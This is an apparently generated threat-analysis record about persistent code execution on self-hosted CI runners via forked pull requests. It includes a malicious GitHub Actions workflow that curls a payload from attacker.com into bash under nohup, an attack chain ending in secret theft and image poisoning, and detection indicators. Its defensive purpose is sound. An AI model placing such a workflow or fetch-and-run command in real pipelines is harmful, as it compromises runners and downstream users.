package_info.package_versions: All versions with default/non-ephemeral self-hosted runner configuration
package_info.why_malicious: The misconfiguration allows untrusted contributors to execute arbitrary code on self-hosted runners via forked pull requests. Attackers can persist malicious processes beyond the workflow lifecycle and potentially modify runner base images, leading to a supply chain compromise affecting all users of the vulnerable runners.

execution_context.trigger: CI/CD workflow execution triggered by a pull request from a forked repository
required_permissions: network (to download remote payloads and exfiltrate data)
process (to launch and manage background processes)

malicious_snippets.code_snippet:
name: Malicious Workflow
on: [pull_request]
jobs:
  malicious_job:
    runs-on: self-hosted
    steps:
      - name: Persist background process
        run: nohup bash -c 'curl http://attacker.com/payload.sh | bash &'
malicious_snippets.code_behavior: During CI/CD workflow execution triggered by a pull request from a forked repository, the workflow launches a background process on the self-hosted runner using 'nohup' and '&', which downloads and executes a remote payload from attacker.com, allowing the process to persist after the workflow completes and enabling ongoing attacker control.

malice_analysis.why_suspicious: The workflow enables arbitrary code execution from untrusted contributors and uses background process techniques (nohup, &), which allow malicious code to persist on the runner after the workflow ends. This persistence is not expected in normal CI/CD operations and can be used to maintain unauthorized access or further compromise the environment.
malice_analysis.violated_expectations: Standard workflows should only execute trusted code and must not persist processes beyond the job lifecycle. This snippet violates the isolation and trust boundaries of CI/CD environments by enabling untrusted code to persist and potentially affect subsequent jobs or the runner itself.
malice_analysis.similar_legitimate_use: Background processes may be legitimately used for monitoring or long-running build tasks, but only in trusted, internal workflows where contributors are vetted and workflows are reviewed. Such use is never appropriate in workflows triggered by untrusted, external contributors.
key_indicators: Arbitrary code execution in workflows triggered by forked pull requests
Use of 'nohup' and '&' to launch persistent background processes
Fetching and executing remote payloads from external domains (e.g., attacker.com)
Workflow modifications in .github/workflows/*.yml by new or untrusted contributors

attack_chain.action: Attacker becomes a contributor by making a trivial change (e.g., typo fix) to the target repository.
attack_chain.leads_to: Ability to submit pull requests with workflows that will auto-execute.

attack_chain.action: Attacker submits a pull request with a modified workflow file in .github/workflows/ that runs on a self-hosted runner.
attack_chain.leads_to: Malicious workflow is picked up and executed by the self-hosted runner.

attack_chain.action: Malicious workflow executes, launching a persistent background process on the self-hosted runner that downloads and runs a remote payload.
attack_chain.leads_to: Attacker gains persistent code execution on the runner, surviving beyond the workflow's lifecycle.

attack_chain.action: Attacker leverages persistent access to inject malicious code into runner base images or exfiltrate secrets from the environment.
attack_chain.leads_to: Potential supply chain compromise for all users of the affected runners.

behavioral_signatures: CI/CD workflow jobs that launch background processes using 'nohup', 'disown', or '&' operators
Workflows in public repositories that allow code execution from forked pull requests by untrusted contributors
Unexpected or persistent network connections initiated during or after workflow execution, especially to external domains
file_indicators: .github/workflows/*.yml files modified in pull requests from new or untrusted contributors
Presence of workflow steps containing 'nohup', 'disown', or '&' in run commands
Workflow files that fetch and execute remote scripts or binaries
network_indicators: Outbound HTTP/HTTPS connections to untrusted or external domains (e.g., attacker.com) during or after workflow execution
Unexpected downloads of remote scripts or binaries initiated by workflow jobs
detection_knowledge.how_to_detect: Monitor for workflow executions triggered by forked pull requests that launch background processes or initiate network connections to external domains. Audit .github/workflows/*.yml files in pull requests from new or untrusted contributors for suspicious modifications, especially those enabling process persistence or remote code execution. Enforce ephemeral runners and restrict workflow execution to trusted contributors to prevent persistence and supply chain compromise.
